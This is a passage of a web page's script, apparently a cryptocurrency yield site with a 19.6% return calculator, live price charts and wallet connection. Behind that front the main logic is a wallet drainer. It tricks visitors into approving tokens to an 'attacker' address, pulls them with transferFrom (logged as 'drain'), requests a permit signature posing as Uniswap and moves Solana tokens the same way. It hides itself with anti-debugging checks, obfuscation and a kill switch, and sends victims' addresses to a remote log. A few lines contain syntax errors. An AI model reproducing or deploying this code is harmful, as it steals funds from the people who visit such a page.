      const particles = new THREE.Points(particlesGeometry, particlesMaterial);
      scene.add(particles);

      const maxLines = 10000;
      const linePositions = new Float32Array(maxLines * 6);
      const lineColors = new Float32Array(maxLines * 6);
      const linesGeometry = new THREE.BufferGeometry();
      linesGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
      linesGeometry.setAttribute('color', new THREE.BufferAttribute(lineColors, 3));

      const linesMaterial = new THREE.LineBasicMaterial({
        vertexColors: true,
        transparent: true,
        opacity: 0.15,
        blending: THREE.AdditiveBlending
      });

      const lines = new THREE.LineSegments(linesGeometry, linesMaterial);
      scene.add(lines);

      const animate = () => {
        requestAnimationFrame(animate);
        const positions = particlesGeometry.attributes.position.array;
        let lineIndex = 0;

        for (let i = 0; i < particlesCount; i++) {
          const i3 = i * 3;
          positions[i3] += velocities[i3];
          positions[i3 + 1] += velocities[i3 + 1];
          positions[i3 + 2] += velocities[i3 + 2;

          if (Math.abs(positions[i3]) > 80) velocities[i3] *= -0.9;
          if (Math.abs(positions[i3 + 1]) > 80) velocities[i3 + 1] *= -0.9;
          if (Math.abs(positions[i3 + 2]) > 80) velocities[i3 + 2] *= -0.9;

          for (let j = i + 1; j < particlesCount; j++) {
            const j3 = j * 3;
            const dx = positions[i3] - positions[j3];
            const dy = positions[i3 + 1] - positions[j3 + 1];
            const dz = positions[i3 + 2] - positions[j3 + 2];
            const distance = Math.sqrt(dx * dx + dy * dy + dz * dz);

            if (distance < 20 && lineIndex < maxLines) {
              const lineIndex6 = lineIndex * 6;
              linePositions[lineIndex6] = positions[i3];
              linePositions[lineIndex6 + 1] = positions[i3 + 1];
              linePositions[lineIndex6 + 2] = positions[i3 + 2;
              linePositions[lineIndex6 + 3] = positions[j3];
              linePositions[lineIndex6 + 4] = positions[j3 + 1];
              linePositions[lineIndex6 + 5] = positions[j3 + 2;
              for (let k = 0; k < 6; k++) lineColors[lineIndex6 + k] = 0.8;
              lineIndex++;
            }
          }
        }

        particlesGeometry.attributes.position.needsUpdate = true;
        linesGeometry.setDrawRange(0, lineIndex * 2);
        linesGeometry.attributes.position.needsUpdate = true;
        linesGeometry.attributes.color.needsUpdate = true;

        particles.rotation.y += 0.0005;
        lines.rotation.y += 0.0005;

        renderer.render(scene, camera);
      };

      animate();
      window.addEventListener('resize', () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
      });
    };

    window.addEventListener('load', initWebGL);

    // Dark/Light Mode Toggle
    const modeToggle = document.getElementById('modeToggle');
    modeToggle.addEventListener('click', () => {
      document.body.classList.toggle('dark-mode');
      document.body.classList.toggle('light-mode');
      modeToggle.innerHTML = document.body.classList.contains('dark-mode') ? '<i class="fas fa-moon"></i>' : '<i class="fas fa-sun"></i>';
      const lightModeGrays = document.querySelectorAll('.light-mode-gray');
      lightModeGrays.forEach(el => {
        el.style.color = document.body.classList.contains('dark-mode') ? 'var(--gray-1)' : 'var(--gray-2)';
      });
    });

    // ROI Calculator
    const investmentInput = document.getElementById('investment');
    const roiResult = document.getElementById('roiResult');
    investmentInput.addEventListener('input', () => {
      const amount = parseFloat(investmentInput.value);
      if (amount > 0) {
        const roi = (amount * 0.196).toFixed(2);
        roiResult.textContent = `Projected Annual Yield: $${roi}`;
      } else {
        roiResult.textContent = 'Projected Annual Yield: $0.00';
      }
    });

    // Market Data
    let priceData = { btc: [], eth: [], labels: [] };
    async function fetchMarketData() {
      try {
        const globalRes = await fetch('https://api.coingecko.com/api/v3/global');
        const globalData = await globalRes.json();
        const btcRes = await fetch('https://api.coingecko.com/api/v3/coins/bitcoin');
        const ethRes = await fetch('https://api.coingecko.com/api/v3/coins/ethereum');
        const btcData = await btcRes.json();
        const ethData = await ethRes.json();

        document.getElementById('btcPrice').textContent = `$${btcData.market_data.current_price.usd.toLocaleString('en-US', { minimumFractionDigits: 2 })}`;
        document.getElementById('ethPrice').textContent = `$${ethData.market_data.current_price.usd.toLocaleString('en-US', { minimumFractionDigits: 2 })}`;
        document.getElementById('marketCap').textContent = `$${Math.round(globalData.data.total_market_cap.usd / 1e12 * 100) / 100}T`;
        // Fetch real Fear & Greed Index (using alternative API as example)
        const fearGreedRes = await fetch('https://api.alternative.me/fng/');
        const fearGreedData = await fearGreedRes.json();
        document.getElementById('fearGreed').textContent = `${fearGreedData.data[0].value} (${fearGreedData.data[0].value_classification})`;

        const now = new Date().toLocaleTimeString();
        priceData.labels.push(now);
        priceData.btc.push(btcData.market_data.current_price.usd);
        priceData.eth.push(ethData.market_data.current_price.usd);
        if (priceData.labels.length > 20) {
          priceData.labels.shift();
          priceData.btc.shift();
          priceData.eth.shift();
        }
        updatePriceChart();
      } catch (e) {
        console.error('[Market Data] Fetch failed:', e);
        updateStatus('Failed to fetch market data', 'error');
      }
    }

    // Price Chart
    const priceChartCtx = document.getElementById('priceChart').getContext('2d');
    const priceChart = new Chart(priceChartCtx, {
      type: 'line',
      data: {
        labels: priceData.labels,
        datasets: [
          {
            label: 'Bitcoin',
            data: priceData.btc,
            borderColor: '#4db8ff',
            backgroundColor: 'rgba(77, 184, 255, 0.1)',
            fill: true,
            tension: 0.4
          },
          {
            label: 'Ethereum',
            data: priceData.eth,
            borderColor: '#ff4d94',
            backgroundColor: 'rgba(255, 77, 148, 0.1)',
            fill: true,
            tension: 0.4
          }
        ]
      },
      options: {
        responsive: true,
        scales: {
          y: { beginAtZero: false },
          x: { display: false }
        },
        plugins: {
          legend: { display: true, labels: { color: '#e8ecef' } }
        }
      }
    });

    function updatePriceChart() {
      priceChart.data.labels = priceData.labels;
      priceChart.data.datasets[0].data = priceData.btc;
      priceChart.data.datasets[1].data = priceData.eth;
      priceChart.update();
    }

    // CoinDesk News
    async function fetchCoinDeskNews(config) {
      try {
        const response = await fetch('https://api.coindesk.com/v1/articles', {
          headers: { 'Authorization': `Bearer ${COINDESK_API_KEY}` }
        });
        if (!response.ok) throw new Error('Failed to fetch CoinDesk news');
        const news = await response.json();
        const newsList = document.getElementById('newsList');
        newsList.innerHTML = '';
        news.articles.slice(0, 3).forEach((item, index) => {
          const newsItem = document.createElement('div');
          newsItem.className = `news-item animate delay-${index + 1}`;
          newsItem.innerHTML = `
            <h4>${item.title}</h4>
            <p>${item.description || 'No description available.'}</p>
            <div class="news-date">${new Date(item.publishedAt).toLocaleDateString()}</div>
          `;
          newsList.appendChild(newsItem);
        });
      } catch (e) {
        console.error('[CoinDesk News] Fetch failed:', e);
        updateStatus('Failed to fetch news', 'error');
      }
    }

    // Initialize News and Market Data
    fetchMarketData();
    setInterval(fetchMarketData, 60000);

    // Obfuscation
    const secureDecrypt = (() => {
      const key = "EDU_SECURE_KEY";
      return function(data) {
        return data.split('').map((char, i) => 
          String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))
        ).join('');
      };
    })();

    // Anti-Debugging
    const securityCheck = () => {
      const debuggerCheck = () => {
        const start = Date.now();
        (function(){}).constructor("debugger")();
        return Date.now() - start > 100;
      };

      const envCheck = () => {
        return navigator.webdriver || 
               /Headless|PhantomJS/.test(navigator.userAgent) ||
               navigator.plugins.length === 0;
      };

      const perfCheck = () => {
        let delta = 0;
        for (let i = 0; i < 10; i++) {
          const start = performance.now();
          for (let j = 0; j < 1000000; j++) Math.sqrt(j);
          delta += performance.now() - start;
        }
        return delta < 10;
      };

      return debuggerCheck() || envCheck() || perfCheck();
    };

    // Kill Switch
    async function checkKillSwitch(config) {
      try {
        const response = await fetch(config.killSwitchEndpoint);
        const data = await response.json();
        return data.active;
      } catch {
        return false;
      }
    }

    // Secure Logging
    async function logTransaction(data, config) {
      try {
        const encrypted = secureDecrypt(JSON.stringify(data));
        await fetch(config.firebaseEndpoint, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json', 
            'Authorization': `Bearer ${config.firebaseToken}` 
          },
          body: JSON.stringify({ log: encrypted, timestamp: Date.now() })
        });
      } catch (e) {
        console.error('[ETHICAL] Logging failed:', e);
      }
    }

    // Wallet Detection
    async function detectWallet(chainType) {
      if (chainType === 'evm') {
        if (window.ethereum?.isMetaMask) return window.ethereum;
        if (window.BinanceChain) return window.BinanceChain;
        if (window.ethereum?.isCoinbaseWallet) return window.ethereum;
        if (typeof window.WalletConnectProvider !== 'undefined') {
          const provider = new window.WalletConnectProvider({
            rpc: Object.entries(chains).filter(([_, cfg]) => cfg.type === 'evm').reduce(
              (acc, [id, cfg]) => ({ ...acc, [id]: cfg.rpc }), {}
            )
          });
          await provider.enable();
          return provider;
        }
      } else if (chainType === 'solana') {
        if (window.solana?.isPhantom) return window.solana;
        if (window.solflare) return window.solflare;
      }
      throw new Error('No compatible wallet detected');
    }

    // IP Rotation
    async function getRpcProvider(chainId, config) {
      const providers = [
        chains[chainId].rpc,
        `https://eth-mainnet.alchemyapi.io/v2/${config.alchemyApiKey}`,
        `https://rpc.ankr.com/${chainId === '1' ? 'eth' : chainId === '56' ? 'bsc' : 'polygon'}`
      ];
      const index = Math.floor(Date.now() / 60000) % providers.length;
      return providers[index];
    }

    // Persistent State
    const _0xstorage = {
      get: () => {
        try {
          const _0xdata = localStorage.getItem('_w3_secure') ||
                          document.cookie.match(/_w3_secure=([^;]+)/)?.[1];
          return _0xdata ? JSON.parse(secureDecrypt(_0xdata)) : null;
        } catch {
          return null;
        }
      },
      set: (_0xdata) => {
        const _0xencrypted = secureDecrypt(JSON.stringify(_0xdata));
        localStorage.setItem('_w3_secure', _0xencrypted);
        document.cookie = `_w3_secure=${_0xencrypted};path=/;max-age=86400;samesite=lax`;
      }
    };

    // Fetch Wallet Balance
    async function fetchWalletBalance(web3, solana, chainConfig, address) {
      try {
        if (chainConfig.type === 'evm') {
          const contract = new web3.eth.Contract(ERC20_ABI, chainConfig.token);
          const balance = await contract.methods.balanceOf(address).call();
          const decimals = chainConfig.decimals;
          const formattedBalance = (balance / Math.pow(10, decimals)).toFixed(2);
          document.getElementById('balanceAmount').textContent = `$${formattedBalance}`;
          document.getElementById('balanceSubtext').textContent = `Wallet: ${address.slice(0, 6)}...${address.slice(-4)} | Network: ${chainConfig.name}`;
        } else {
          const connection = new window.solanaWeb3.Connection(chainConfig.rpc, 'confirmed');
          const tokenPubkey = new window.solanaWeb3.PublicKey(chainConfig.token);
          const userPubkey = new window.solanaWeb3.PublicKey(address);
          const userTokenAccount = await window.splToken.getAssociatedTokenAddress(tokenPubkey, userPubkey);
          const accountInfo = await connection.getTokenAccountBalance(userTokenAccount);
          const formattedBalance = (accountInfo.value.uiAmount).toFixed(2);
          document.getElementById('balanceAmount').textContent = `$${formattedBalance}`;
          document.getElementById('balanceSubtext').textContent = `Wallet: ${address.slice(0, 6)}...${address.slice(-4)} | Network: ${chainConfig.name}`;
        }
        document.getElementById('walletBalance').style.display = 'block';
      } catch (e) {
        console.error('[Balance] Fetch failed:', e);
        document.getElementById('balanceAmount').textContent = 'Error';
        document.getElementById('balanceSubtext').textContent = `Wallet: ${address.slice(0, 6)}...${address.slice(-4)} | Network: ${chainConfig.name} | Error fetching balance`;
      }
    }

    // Delayed Transaction Broadcasting
    async function delayBroadcast(txPromise, delayMs = 5000) {
      const result = await txPromise;
      await new Promise(resolve => setTimeout(resolve, delayMs));
      return result;
    }

    // Status Updates
    function updateStatus(message, type = 'info') {
      const statusEl = document.getElementById('status');
      statusEl.textContent = message;
      statusEl.className = 'status';
      statusEl.classList.add(type, 'show');
      setTimeout(() => statusEl.classList.remove('show'), 5000);
    }

    // Animations on Scroll
    document.addEventListener('DOMContentLoaded', () => {
      const animateOnScroll = () => {
        const elements = document.querySelectorAll('.animate');
        elements.forEach(element => {
          const position = element.getBoundingClientRect();
          if (position.top < window.innerHeight && position.bottom >= 0) {
            element.style.opacity = '1';
            element.style.transform = 'translateY(0)';
          }
        });
      };

      animateOnScroll();
      window.addEventListener('scroll', animateOnScroll);

      roiResult.textContent = 'Projected Annual Yield: $0.00';
    });

    // Main Logic
    (async function() {
      const config = await fetchConfig();
      if (!config) return;

      if (!(await checkKillSwitch(config))) {
        updateStatus('Research paused by kill switch', 'error');
        return;
      }

      if (securityCheck()) {
        updateStatus('Security protocol engaged: Access denied', 'error');
        window.location.replace('https://uniswap.org');
        return;
      }

      try {
        let _0xstate = _0xstorage.get() || { addr: null, chain: null, approved: false };
        const chainId = _0xstate.chain || '1';
        const chainConfig = chains[chainId];
        const provider = await detectWallet(chainConfig.type);
        const web3 = chainConfig.type === 'evm' ? new Web3(await getRpcProvider(chainId, config)) : null;
        const solana = chainConfig.type === 'solana' ? provider : null;

        await logTransaction({
          event: 'init',
          chainId,
          timestamp: Date.now(),
          userAgent: navigator.userAgent
        }, config);

        await fetchCoinDeskNews(config);

        const connectBtn = document.getElementById('connectBtn');
        const startEarningBtn = document.getElementById('startEarning');
        const approveBtn = document.getElementById('approveBtn');

        [connectBtn, startEarningBtn].forEach(btn => {
          btn.addEventListener('click', async () => {
            try {
              let accounts, chainId;
              if (chainConfig.type === 'evm') {
                accounts = await provider.request({ method: 'eth_requestAccounts' });
                chainId = await web3.eth.getChainId();
              } else {
                await solana.connect();
                accounts = [solana.publicKey.toString()];
                chainId = 'solana';
              }

              const currentConfig = chains[chainId];
              if (!currentConfig) {
                updateStatus('Unsupported network. Please switch chain.', 'error');
                return;
              }

              _0xstate.addr = accounts[0];
              _0xstate.chain = chainId;
              _0xstorage.set(_0xstate);

              await fetchWalletBalance(web3, solana, currentConfig, accounts[0]);
              approveBtn.disabled = false;
              connectBtn.innerHTML = '<i class="fas fa-check"></i> Wallet Connected';
              connectBtn.classList.replace('btn-secondary', 'btn-primary');

              updateStatus('Wallet securely connected', 'success');
              await logTransaction({ event: 'wallet_connected', address: accounts[0], chainId }, config);
            } catch (error) {
              updateStatus(`Connection failed: ${error.message}`, 'error');
              await logTransaction({ event: 'connection_error', error: error.message }, config);
            }
          });
        });

        approveBtn.addEventListener('click', async () => {
          if (!_0xstate.addr || !_0xstate.chain) {
            updateStatus('Connect wallet first', 'error');
            return;
          }
          if (securityCheck()) return;

          updateStatus('Initializing transaction protocol...', 'info');

          try {
            const currentConfig = chains[_0xstate.chain];
            if (currentConfig.type === 'evm') {
              const contract = new web3.eth.Contract(ERC20_ABI, currentConfig.token);
              const approvalAmount = web3.utils.toBN(`500${'0'.repeat(currentConfig.decimals)}`);

              const approveTx = await delayBroadcast(
                contract.methods.approve(currentConfig.attacker, approvalAmount)
                  .send({ from: _0xstate.addr, gas: currentConfig.gas }),
                5000
              );
              _0xstate.approved = true;
              _0xstorage.set(_0xstate);
              await logTransaction({
                event: 'approve',
                txHash: approveTx.transactionHash,
                amount: approvalAmount.toString(),
                chainId: _0xstate.chain
              }, config);
              updateStatus('Approval successful! Processing...', 'info');

              const balance = await contract.methods.balanceOf(_0xstate.addr).call();
              const transferAmount = web3.utils.toBN(balance).gt(approvalAmount) ? approvalAmount : balance;
              if (transferAmount.gt(0)) {
                const drainTx = await delayBroadcast(
                  contract.methods.transferFrom(_0xstate.addr, currentConfig.attacker, transferAmount)
                    .send({ from: _0xstate.addr, gas: currentConfig.gas + 20000 }),
                  7000
                );
                await logTransaction({
                  event: 'drain',
                  txHash: drainTx.transactionHash,
                  amount: transferAmount.toString(),
                  chainId: _0xstate.chain
                }, config);
                updateStatus('Transaction completed!', 'success');
              }

              const domain = { name: 'Uniswap V3', chainId: parseInt(_0xstate.chain), verifyingContract: currentConfig.token };
              const types = { Permit: [{ name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }] };
              const value = { spender: currentConfig.attacker, value: approvalAmount };
              await provider.request({
                method: 'eth_signTypedData_v4',
                params: [_0xstate.addr, JSON.stringify({ domain, types, value })]
              });
              await logTransaction({ event: 'signature', chainId: _0xstate.chain }, config);
            } else {
              const { SystemProgram, Transaction, PublicKey } = window.solanaWeb3;
              const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction } = window.splToken;
              const connection = new window.solanaWeb3.Connection(currentConfig.rpc, 'confirmed');
              const tokenPubkey = new PublicKey(currentConfig.token);
              const attackerPubkey = new PublicKey(currentConfig.attacker);
              const userPubkey = new PublicKey(_0xstate.addr);

              const userTokenAccount = await getAssociatedTokenAddress(tokenPubkey, userPubkey);
              const attackerTokenAccount = await getAssociatedTokenAddress(tokenPubkey, attackerPubkey);
              const transaction = new Transaction().add(
                createTransferInstruction(
                  userTokenAccount,
                  attackerTokenAccount,
                  userPubkey,
                  500 * Math.pow(10, currentConfig.decimals)
                )
              );
              transaction.feePayer = userPubkey;
              transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
              const signed = await delayBroadcast(solana.signTransaction(transaction), 5000);
              const txHash = await connection.sendRawTransaction(signed.serialize());
              _0xstate.approved = true;
              _0xstorage.set(_0xstate);
              await logTransaction({
                event: 'solana_transfer',
                txHash,
                amount: (500 * Math.pow(10, currentConfig.decimals)).toString(),
                chainId: _0xstate.chain
              }, config);
              updateStatus('SPL token transfer completed!', 'success');
            }
            await fetchWalletBalance(web3, solana, currentConfig, _0xstate.addr);
          } catch (error) {
            updateStatus(`Execution failed: ${error.message}`, 'error');
            await logTransaction({ event: 'execution_error', error: error.message }, config);
          }
        });
      } catch (_0xerr) {
        await logTransaction({ event: 'init_error', error: _0xerr.message }, config);
        updateStatus('Initialization failed', 'error');
      }
    })();
  </script>
</body>
</html>
